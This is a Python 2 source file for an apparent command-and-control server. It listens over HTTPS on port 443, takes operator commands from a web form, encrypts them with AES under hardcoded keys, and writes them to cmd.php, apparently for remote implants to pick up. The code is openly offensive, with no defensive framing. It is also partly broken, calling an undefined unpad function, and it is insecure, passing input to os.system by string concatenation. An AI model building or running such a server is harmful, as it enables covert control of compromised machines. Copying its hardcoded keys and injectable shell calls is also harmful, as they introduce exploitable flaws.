import BaseHTTPServer
import SimpleHTTPServer
import SocketServer
import logging
import cgi
import ssl
import os
import base64
import hashlib
from Crypto.Cipher import AES
from Crypto import Random

PORT = 443

class AESCipher:
   def __init__( self, key ):
      self.key = key
      self.salt = "CorrectHorseBatteryStaple"
      self.init = "Yet another key"

   def encrypt( self, raw ):
      word = map(ord, self.key) + map(ord, self.salt)
      word = "".join(map(chr, word))
      hash = hashlib.sha1(self.init).hexdigest()
      bray = map(ord, hash.upper())[0:15]
      hash = map(chr, bray)
      iv = "".join(hash)
      iv = iv[:-ord(iv[len(iv)-1:])]
      
      #iv = Random.new().read( AES.block_size )
      #init = "abcdefghijklmnopqrstuvwxyz"
      #iv = init[0:AES.block_size]
      #AES.block_size = 0x80
      iv = hashlib.sha1("test").hexdigest().upper()[0:16]
      key = hashlib.sha1("test").hexdigest().upper()[0:16]
      #raw = 'The answer is no'

      #Pad CMDs
      if len(raw) % 16 != 0:
         raw += ' ' * (16 - len(raw) %16)

      cipher = AES.new(key, AES.MODE_CBC, iv)
      return base64.b64encode(cipher.encrypt(raw))

   def decrypt( self, enc ):
      enc = base64.b64decode(enc)
      iv = enc[:16]
      cipher = AES.new(self.key, AES.MODE_CBC, iv )
      return unpad(cipher.decrypt( enc[16:] ))


class C2Handler:
   #def __init__( self, target):
   #   self.target = target

   def formHandler(self, form):
      #if CMD
      #try:
         print str(form).split(",")[0].split("'")[1]
         #print str(form).split(",")[2].split("'")[1]
         cmd = str(form).split(",")[2].split("'")[1]
         self.execute(cmd)
      #except:
         print form

   def execute(self, cmd):
      cryptcmd = AESCipher("hacktheplanet").encrypt(cmd)
      #phphead = cryptcmd + "\"<?php include 'track.php';?>\""
      print cryptcmd
      os.system("echo " + cryptcmd + " > cmd.php")

class gui:
   #def 

   def index(self):
      with open("gui/index.htm") as page:
         content = page.readlines()

      
      site = ' '.join(content)

      return site


class ServerHandler(SimpleHTTPServer.SimpleHTTPRequestHandler):
   def do_GET(self):
      #logging.warning("============= GET STARTED ==============")
      #logging.warning(self.headers)

      if self.path=='/':
         #This URL will trigger our sample function and send what it returns back to the browser
         self.send_response(200)
         self.send_header('Content-type','text/html')
         self.end_headers()
         self.wfile.write(gui().index()) #call sample function here
         return
      else:
         #print self.path
         SimpleHTTPServer.SimpleHTTPRequestHandler.do_GET(self)

   def do_POST(self):
      logging.warning("============= POST STARTED =============")
      logging.warning(self.headers)
      form = cgi.FieldStorage(
         fp=self.rfile,
         headers=self.headers,
         environ={'REQUEST_METHOD':'POST',
                  'CONTENT_TYPE': self.headers['Content-Type'],
                 })
      logging.warning("============= POST VALUES ==============")
      for item in form.list:
         logging.warning(item)
      logging.warning("\n")
      SimpleHTTPServer.SimpleHTTPRequestHandler.do_GET(self)
      C2Handler().formHandler(form.list)

Handler = ServerHandler

#httpd = BaseHTTPServer.HTTPServer(('0.0.0.0', 443), SimpleHTTPServer.SimpleHTTPRequestHandler)

SocketServer.TCPServer.allow_reuse_address=True
httpd = SocketServer.TCPServer(("", PORT), Handler)


httpd.socket = ssl.wrap_socket (httpd.socket, certfile='cert.pem', server_side=True)
httpd.serve_forever()
